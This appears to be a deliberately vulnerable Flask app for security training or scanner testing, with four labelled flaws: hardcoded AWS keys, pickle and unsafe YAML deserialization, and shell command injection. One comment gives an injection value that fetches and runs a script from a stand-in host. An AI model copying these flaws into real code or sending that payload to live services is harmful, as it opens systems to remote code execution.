import base64
import pickle
import subprocess

import yaml
from flask import Flask, request

app = Flask(__name__)

# VULN 1: Hardcoded cloud credentials committed to source control
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


# VULN 2: Insecure Deserialization — pickle.loads on attacker-controlled bytes.
# A crafted payload runs arbitrary code during unpickling (RCE).
@app.route("/jobs/restore", methods=["POST"])
def restore():
    blob = base64.b64decode(request.get_data())
    job = pickle.loads(blob)  # RCE
    return {"restored": str(job)}


# VULN 3: Unsafe YAML load — yaml.load with the full Loader constructs
# arbitrary Python objects from untrusted input (RCE).
@app.route("/config", methods=["POST"])
def load_config():
    cfg = yaml.load(request.get_data(), Loader=yaml.Loader)  # RCE
    return {"keys": list(cfg.keys())}


# VULN 4: OS Command Injection — user input interpolated into a shell command
# run with shell=True.
@app.route("/convert")
def convert():
    name = request.args.get("file")
    out = subprocess.check_output(
        f"ffmpeg -i /data/{name} /out/{name}.mp4", shell=True
    )  # ?file=x; curl evil.sh | bash
    return {"output": out.decode(errors="ignore")}


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8100)
